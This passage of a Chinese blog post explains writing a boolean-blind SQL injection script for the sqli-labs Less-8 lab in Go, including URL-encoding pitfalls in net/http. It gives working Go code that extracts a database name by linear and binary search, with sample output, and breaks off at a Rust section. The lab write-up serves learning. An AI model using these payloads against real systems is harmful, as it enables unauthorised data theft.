+<p>这个库等价于 python 中的 requests，其使用的基础库是 <code class="language-plaintext highlighter-rouge">net/http</code>（等价于 Python 中的 urllib）。</p>
+
+<h3 id="坑点-2未编码-url">坑点 2：未编码 URL</h3>
+
+<p>如果带着 Python 的相同写法来写代码，那么很容易出现你意料之外的事情。</p>
+
+<p><strong>坑点 2：一定要编码 URL，否则会导致 URL“不全”的错误。</strong></p>
+
+<p>什么意思呢？这里用代码举个例子：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">var</span> <span class="n">mark</span> <span class="o">=</span> <span class="s">"You are in"</span>
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c">// 与Python相同的payload</span>
+	<span class="n">url</span> <span class="o">:=</span> <span class="s">"http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"</span>
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">Fatalln</span><span class="p">(</span><span class="s">"Unable to make request: "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Yes! You are in!"</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ohh! You are not in!"</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这段代码的执行结果为：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ohh! You are not <span class="k">in</span><span class="o">!</span>
+</code></pre></div></div>
+
+<p>咦～？怎么回事？为什么我们说好的 payload 没作用了？是这个 grequests 的库问题？还是 golang 的版本问题（我的 go 版本是 1.13.6）？还是这个 golang 版本的 <code class="language-plaintext highlighter-rouge">net/http</code> 的问题（比如这个 <a href="https://github.com/golang/go/issues/4013">issue</a> ）？</p>
+
+<p>不知道。很有可能在任何一个过程中出错。</p>
+
+<h3 id="排查错误与修复">排查错误与修复</h3>
+
+<ol>
+  <li>排查 URL</li>
+</ol>
+
+<p>payload 也就是 URL 其实是很容易复制错的，因此优先看这个是否存在错误。</p>
+
+<p>这时我们需要去打印出这个 request 的 url 的时候，经过我一段时间的探索后，发现 grequests 这个库没有办法显示出请求的 URL 一样，不像 Python 的 requests 库一样。比如这个 issue：
+https://github.com/levigross/grequests/issues/49</p>
+
+<p>很遗憾，grequests 不像 python 的 requests 库一样强大。</p>
+
+<p>那么我们在网页服务端显示出我们需要执行的 sql 的 payload 即可。</p>
+
+<p>第一步：</p>
+
+<p>进入 docker 的这个 container：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 换成自己的container ID</span>
+docker <span class="nb">exec</span> <span class="nt">-it</span> 5e37d8d /bin/bash
+</code></pre></div></div>
+
+<p>第二步：</p>
+
+<p>给网页显示增加显示 SQL 的执行语句的功能：</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">vi</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="nc">Less</span><span class="o">-</span><span class="mi">8</span><span class="o">/</span><span class="n">index</span><span class="mf">.</span><span class="n">php</span>
+
+<span class="nv">$sql</span><span class="o">=</span><span class="s2">"SELECT * FROM users WHERE id='</span><span class="nv">$id</span><span class="s2">' LIMIT 0,1"</span><span class="p">;</span>
+<span class="c1"># 在这句的下面新添加语句如下：</span>
+<span class="k">echo</span> <span class="s2">"&lt;font size='5' color= '#99FF00'&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s1">'Your SQL:'</span><span class="mf">.</span> <span class="nv">$sql</span> <span class="mf">.</span> <span class="s1">'&lt;br&gt;'</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;/font&gt;"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>然后增加输出 response 的 body 本身，代码修改如下：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">var</span> <span class="n">mark</span> <span class="o">=</span> <span class="s">"You are in"</span>
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c">//url := "http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115%20--+"</span>
+	<span class="n">url</span> <span class="o">:=</span> <span class="s">"http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"</span>
+	<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">log</span><span class="o">.</span><span class="n">Fatalln</span><span class="p">(</span><span class="s">"Unable to make request: "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="c">// 新加：打印出body本身：为了显示出URL是否生效</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+	<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Yes! You are in"</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ohh! You are not in!"</span><span class="p">)</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>结果如下：</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">xmlns=</span><span class="s">"http://www.w3.org/1999/xhtml"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"Content-Type"</span> <span class="na">content=</span><span class="s">"text/html; charset=utf-8"</span> <span class="nt">/&gt;</span>
+<span class="nt">&lt;title&gt;</span>Less-8 Blind- Boolian- Single Quotes- String<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+
+<span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"#000000"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">" margin-top:60px;color:#FFF; font-size:23px; text-align:center"</span><span class="nt">&gt;</span>Welcome<span class="ni">&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">"#FF0000"</span><span class="nt">&gt;</span> Dhakkan <span class="nt">&lt;/font&gt;&lt;br&gt;</span>
+<span class="nt">&lt;font</span> <span class="na">size=</span><span class="s">"3"</span> <span class="na">color=</span><span class="s">"#FFFF00"</span><span class="nt">&gt;</span>
+
+<span class="c">&lt;!-- 省略了一大堆空行 --&gt;</span>
+
+<span class="nt">&lt;font</span> <span class="na">size=</span><span class="s">'5'</span> <span class="na">color= </span><span class="s">'#99FF00'</span><span class="nt">&gt;</span>Your SQL:SELECT * FROM users WHERE id='1'' LIMIT 0,1<span class="nt">&lt;br&gt;&lt;/font&gt;&lt;font</span> <span class="na">size=</span><span class="s">"5"</span> <span class="na">color=</span><span class="s">"#FFFF00"</span><span class="nt">&gt;&lt;/br&gt;&lt;/font&gt;&lt;font</span> <span class="na">color= </span><span class="s">"#0000ff"</span> <span class="na">font</span> <span class="na">size= </span><span class="s">3</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/font&gt;</span> <span class="nt">&lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"../images/Less-8.jpg"</span> <span class="nt">/&gt;&lt;/center&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+
+Ohh! You are not in!
+</code></pre></div></div>
+
+<p>可以看到，我们的 SQL 语句变成了：</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1</span><span class="se">''</span><span class="s1"> LIMIT 0,1
+</span></code></pre></div></div>
+
+<p>难怪 payload 没有生效！我们的语句就没有传达到服务端（因为这个 sqli-labs 是不自带 WAF 的）。</p>
+
+<p>这个问题就说明了，我们在客户端进行发送的时候肯定出了什么问题。那么问题就定位在 grequests 或者 golang 的 <code class="language-plaintext highlighter-rouge">net/http</code> 身上。</p>
+
+<ol>
+  <li>排查 grequests 或 golang 的 <code class="language-plaintext highlighter-rouge">net/http</code></li>
+</ol>
+
+<p>经过我个人的一番翻阅源代码，比如这个：
+https://github.com/levigross/grequests/blob/253788527a1af7adb29e20dee7165c2b5b43f08f/request.go#L148-L210
+grequests 用的就是 <code class="language-plaintext highlighter-rouge">net/http</code> 与 <code class="language-plaintext highlighter-rouge">net/url</code> 去发送请求的。因此 grequests 的库本身是没什么大的问题的。（虽然以我浅薄的认知，我觉得 grequests 是可以改进的，比如进行“适度地”编码。）</p>
+
+<p>PS: 为什么是“适度地”编码？因为我们只想要它把空格编码成 <code class="language-plaintext highlighter-rouge">%20</code> 这种程度即可，对于末尾的关键性的<code class="language-plaintext highlighter-rouge">+</code>，我们不希望它编码为 <code class="language-plaintext highlighter-rouge">%2B</code>，否则我们的 payload 就会彻底失效。但是这个度其实是很难把握度，所以 grequests 维持这样的状态是完全可以理解的。</p>
+
+<ol>
+  <li>修复由于 golang<code class="language-plaintext highlighter-rouge">net/http</code> 带来的问题</li>
+</ol>
+
+<p>既然是 golang 自己的库解析的问题，说明我们很难通过修改底层的源代码去解决这个问题。那么我们来探索一下这个到底发生了什么，为什么会发生这样的情况。</p>
+
+<p>在开始之前，我们可以根据上面的第二点，知道，我们的 payload 在 <code class="language-plaintext highlighter-rouge">'</code> 之后被“截断”了，也就是空格之后就没了。</p>
+
+<p>那么我们猜测，这里是因为有空格的问题而被截断了。</p>
+
+<p>理由有如下：</p>
+<ol>
+  <li>在 payload 上看不到空格以后的东西了</li>
+  <li>根据这个 <a href="https://github.com/golang/go/issues/4013">issue</a>，可以知道，空格在 URL 中是危险的。因此要么会被转义成 <code class="language-plaintext highlighter-rouge">%20</code> 或者<code class="language-plaintext highlighter-rouge">+</code>（RFC 更加倾向前者）。</li>
+</ol>
+
+<p>所以基于以上理由，我们假设：<strong>URL 中未被编码的空格会被截断掉</strong>。当然这个假设的前提是 golang 的版本是 <code class="language-plaintext highlighter-rouge">1.13.6</code>。可能在其他版本中会被休息（个人认为可能性不大，因为这个不算是一个 bug，而更加可能是一个 feature）。</p>
+
+<p>我们来进行代码执行对比一下来验证我们的猜想。URL 我们测试两个：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">// 第一个为手工编码</span>
+<span class="n">url</span> <span class="o">:=</span> <span class="s">"http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115%20--+"</span>
+<span class="c">// 第二个为原始，未编码</span>
+<span class="n">url</span> <span class="o">:=</span> <span class="s">"http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"</span>
+</code></pre></div></div>
+
+<p>测试结果如下：（为了显示简洁，不打印 response 的 body 内容了）</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 第一个结果：</span>
+Yes! You are <span class="k">in</span>
+
+<span class="c"># 第二个结果：</span>
+Ohh! You are not <span class="k">in</span><span class="o">!</span>
+</code></pre></div></div>
+
+<p>我们的猜想合理且正确！<strong>URL 中未被编码的空格的确会被截断掉。</strong></p>
+
+<h3 id="完整的代码-1">完整的代码</h3>
+
+<p>到此，遇到的问题也解决了。直接看下代码里怎么写。整体和 Python 版的类似，并无其他大的区别。</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"github.com/levigross/grequests"</span>
+	<span class="s">"log"</span>
+	<span class="s">"strings"</span>
+	<span class="s">"time"</span>
+<span class="p">)</span>
+
+<span class="k">var</span> <span class="n">baseURL</span> <span class="o">=</span> <span class="s">"http://192.168.3.104/Less-8/?id="</span>
+<span class="k">var</span> <span class="n">mark</span> <span class="o">=</span> <span class="s">"You are in"</span>
+
+<span class="c">// Comes from: https://dev.to/rubiin/measure-function-execution-time-in-golang-177l</span>
+<span class="k">func</span> <span class="n">measureTime</span><span class="p">(</span><span class="n">start</span> <span class="n">time</span><span class="o">.</span><span class="n">Time</span><span class="p">,</span> <span class="n">name</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">elapsed</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Since</span><span class="p">(</span><span class="n">start</span><span class="p">)</span>
+	<span class="n">log</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Time for %s: %s"</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">elapsed</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">probeDatabaseLinear</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="k">defer</span> <span class="n">measureTime</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">(),</span> <span class="s">"Linear"</span><span class="p">)</span>
+
+    <span class="c">// 为了方便拼接和复用，此处把sqlPayload单独独立出来（亦可作为一个函数参数传递进来）</span>
+	<span class="n">sqlPayload</span> <span class="o">:=</span> <span class="s">"database()"</span>
+	<span class="n">dbName</span> <span class="o">:=</span> <span class="s">""</span>
+
+	<span class="c">// all visible character is: 32( )-&gt;126(~)</span>
+	<span class="n">j</span> <span class="o">:=</span> <span class="m">1</span>
+	<span class="n">exitFlag</span> <span class="o">:=</span> <span class="no">false</span>
+	<span class="k">for</span> <span class="o">!</span><span class="n">exitFlag</span> <span class="p">{</span>
+		<span class="c">// always assume we will exit in this loop</span>
+		<span class="n">exitFlag</span> <span class="o">=</span> <span class="no">true</span>
+		<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">36</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">127</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span>  <span class="p">{</span>
+			<span class="c">// raw payload: 1' and ascii(substr(database(),1,1))=115 --+</span>
+			<span class="c">// We need to encode ` `(Space) into `%20` to ensure net/http processes URL correctly</span>
+			<span class="n">payload</span> <span class="o">:=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"1'%%20and%%20ascii(substr(%s,%d,%d))=%d%%20--+"</span><span class="p">,</span> <span class="n">sqlPayload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+			<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">baseURL</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+				<span class="n">log</span><span class="o">.</span><span class="n">Fatalln</span><span class="p">(</span><span class="s">"Unable to make request: "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+			<span class="p">}</span>
+			<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">dbName</span> <span class="o">+=</span> <span class="kt">string</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+				<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"database: "</span><span class="p">,</span> <span class="n">dbName</span><span class="p">)</span>
+				<span class="n">exitFlag</span> <span class="o">=</span> <span class="no">false</span>
+				<span class="k">break</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="n">j</span> <span class="o">+=</span> <span class="m">1</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">dbName</span>
+<span class="p">}</span>
+
+
+<span class="k">func</span> <span class="n">probeDatabaseBinary</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
+	<span class="k">defer</span> <span class="n">measureTime</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">(),</span> <span class="s">"Binary"</span><span class="p">)</span>
+
+	<span class="n">dbName</span> <span class="o">:=</span> <span class="s">""</span>
+	<span class="n">sqlPayload</span> <span class="o">:=</span> <span class="s">"database()"</span>
+
+	<span class="c">// all visible character is: 32( )-&gt;126(~)</span>
+	<span class="n">j</span> <span class="o">:=</span> <span class="m">1</span>
+	<span class="n">exitFlag</span> <span class="o">:=</span> <span class="no">false</span>
+	<span class="k">for</span> <span class="o">!</span><span class="n">exitFlag</span> <span class="p">{</span>
+		<span class="c">// always assume we will exit in this loop</span>
+		<span class="n">exitFlag</span> <span class="o">=</span> <span class="no">true</span>
+		<span class="n">low</span> <span class="o">:=</span> <span class="m">32</span>
+		<span class="n">high</span> <span class="o">:=</span> <span class="m">126</span>
+		<span class="k">for</span> <span class="n">high</span> <span class="o">&gt;=</span> <span class="n">low</span> <span class="p">{</span>
+			<span class="n">mid</span> <span class="o">:=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">/</span> <span class="m">2</span>
+
+			<span class="c">// test current position</span>
+			<span class="c">// raw payload: 1' and ascii(substr(database(),1,1))=114 --+</span>
+			<span class="c">// We need to encode ` `(Space) into `%20` to ensure net/http processes URL correctly</span>
+			<span class="n">payload</span> <span class="o">:=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"1'%%20and%%20ascii(substr(%s,%d,%d))=%d%%20--+"</span><span class="p">,</span> <span class="n">sqlPayload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
+			<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">baseURL</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+				<span class="n">log</span><span class="o">.</span><span class="n">Fatalln</span><span class="p">(</span><span class="s">"Unable to make request: "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+			<span class="p">}</span>
+			<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">dbName</span> <span class="o">+=</span> <span class="kt">string</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
+				<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"database: "</span><span class="p">,</span> <span class="n">dbName</span><span class="p">)</span>
+				<span class="n">exitFlag</span> <span class="o">=</span> <span class="no">false</span>
+				<span class="k">break</span>
+			<span class="p">}</span>
+
+			<span class="c">// another test for narrow down left or right range to search</span>
+			<span class="n">payload</span> <span class="o">=</span> <span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"1'%%20and%%20ascii(substr(%s,%d,%d))&gt;%d%%20--+"</span><span class="p">,</span> <span class="n">sqlPayload</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">mid</span><span class="p">)</span>
+			<span class="n">resp</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">grequests</span><span class="o">.</span><span class="n">Get</span><span class="p">(</span><span class="n">baseURL</span> <span class="o">+</span> <span class="n">payload</span><span class="p">,</span> <span class="no">nil</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+				<span class="n">log</span><span class="o">.</span><span class="n">Fatalln</span><span class="p">(</span><span class="s">"Unable to make request: "</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+			<span class="p">}</span>
+			<span class="k">if</span> <span class="n">strings</span><span class="o">.</span><span class="n">Contains</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">String</span><span class="p">(),</span> <span class="n">mark</span><span class="p">)</span> <span class="p">{</span>
+				<span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="m">1</span>
+			<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+				<span class="n">high</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">-</span> <span class="m">1</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+		<span class="n">j</span> <span class="o">+=</span> <span class="m">1</span>
+	<span class="p">}</span>
+
+	<span class="k">return</span> <span class="n">dbName</span>
+<span class="p">}</span>
+
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">probeDatabaseLinear</span><span class="p">()</span>
+
+	<span class="n">probeDatabaseBinary</span><span class="p">()</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>同样看下执行结果：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>database:  s
+database:  se
+database:  sec
+database:  secu
+database:  secur
+database:  securi
+database:  securit
+database:  security
+2021/05/28 15:36:44 Time <span class="k">for </span>Linear: 2.852781115s
+database:  s
+database:  se
+database:  sec
+database:  secu
+database:  secur
+database:  securi
+database:  securit
+database:  security
+2021/05/28 15:36:44 Time <span class="k">for </span>Binary: 351.54255ms
+</code></pre></div></div>
+
+<p>额～虽然可能大多数人普遍认为安全行业的工具类东西不需要考虑性能，但是 Golang 的这个效率的确很香。</p>
+
+<h3 id="其他想法与测试">其他想法与测试</h3>
+
+<p>那么，我们能不能不手工去编码，这样不优雅啊，直接去调用 golang 的 <code class="language-plaintext highlighter-rouge">net/url</code> 来帮我们编码呢？</p>
+
+<p>想法很好，但是很可惜不能。golang 的 url 编码太彻底了。会让我们的 url payload 失效。</p>
+
+<p>我们举个例子：</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"net/url"</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c">// Let's start with a base url</span>
+	<span class="n">baseUrl</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Parse</span><span class="p">(</span><span class="s">"http://192.168.3.104"</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Malformed URL: "</span><span class="p">,</span> <span class="n">err</span><span class="o">.</span><span class="n">Error</span><span class="p">())</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="c">// Add a Path Segment (Path segment is automatically escaped)</span>
+	<span class="n">baseUrl</span><span class="o">.</span><span class="n">Path</span> <span class="o">+=</span> <span class="s">"Less-8/"</span>
+
+	<span class="c">// Prepare Query Parameters</span>
+	<span class="n">params</span> <span class="o">:=</span> <span class="n">url</span><span class="o">.</span><span class="n">Values</span><span class="p">{}</span>
+	<span class="n">params</span><span class="o">.</span><span class="n">Add</span><span class="p">(</span><span class="s">"id"</span><span class="p">,</span> <span class="s">"1' and ascii(substr(database(),1,1))=115 --+"</span><span class="p">)</span>
+
+	<span class="c">// Add Query Parameters to the URL</span>
+	<span class="n">baseUrl</span><span class="o">.</span><span class="n">RawQuery</span> <span class="o">=</span> <span class="n">params</span><span class="o">.</span><span class="n">Encode</span><span class="p">()</span> <span class="c">// Escape Query Parameters</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Encoded URL is %q</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">baseUrl</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>然后结果为：</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Encoded URL is <span class="s2">"http://192.168.3.104/Less-8/?id=1%27+and+ascii%28substr%28database%28%29%2C1%2C1%29%29%3D115+--%2B"</span>
+</code></pre></div></div>
+
+<p>未去访问这个 url 就知道不行了，最后一个<code class="language-plaintext highlighter-rouge">+</code> 被编码了。</p>
+
+<p>不如真实访问一下看看网页的 payload 是怎样的：</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Your</span> <span class="k">SQL</span><span class="p">:</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">and</span> <span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">115</span> <span class="c1">--+' LIMIT 0,1</span>
+</code></pre></div></div>
+
+<p>果然没有 <code class="language-plaintext highlighter-rouge">You are in</code> 的标示，通过 SQL 也可以看出来为什么我们的 payload 不成功。</p>
+
+<p>因此，结论：<strong>当我们有这个需求的时候，只能通过手工编码。</strong></p>
+
+<h2 id="rust-版">Rust 版</h2>
+
+<p>Rust 中的有没有 python 一样的 requests 库呢？
+答：还真没有可用且成熟的（截止 2021 年 5 月）。有一个 <a href="https://docs.rs/requests">requests 库</a>，但是这个库是 3 年前更新的，你敢用吗？我不敢。</p>
+
+<p>但是，Rust 中有比 python 的 requets 的库更强大的库：<a href="https://docs.rs/reqwest">reqwest</a>。</p>
+
+<p>它虽然没有类似于 Python 的 requests 库一样的 API，但是它足够强大，甚至支持默认支持异步。</p>
+
+<p>所以，python 的 requests 库等同于 Rust 的 reqwest，python 的 <code class="language-plaintext highlighter-rouge">urllib</code> 等同于 Rust 的 <code class="language-plaintext highlighter-rouge">Hyper</code>（其实更加与 Golang 的 <code class="language-plaintext highlighter-rouge">net/http</code> 更像）。</p>
+
+<h3 id="坑点-3rust-中坑点">坑点 3：Rust 中坑点</h3>
+
+<p>Rust 这么完美的语言怎么可能有坑点？没有的。</p>
+
+<h3 id="简单的非异步-reqwest-示例">简单的非异步 reqwest 示例</h3>
+
+<p>由于 reqwest 默认启用异步的 feature，但是我们只请求简单的内容，无需用上异步这么复杂又牛逼的东西。</p>
+
+<p>因此在 <code class="language-plaintext highlighter-rouge">Cargo.toml</code> 中增加如下内容以启用 <code class="language-plaintext highlighter-rouge">blocking</code> 的 feature：</p>
+
+<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[dependencies]</span>
+<span class="nn">reqwest</span> <span class="o">=</span> <span class="p">{</span> <span class="py">version</span> <span class="p">=</span> <span class="s">"0.11.3"</span><span class="p">,</span> <span class="py">features</span> <span class="p">=</span> <span class="nn">["blocking"]</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>主要的代码如下：</p>
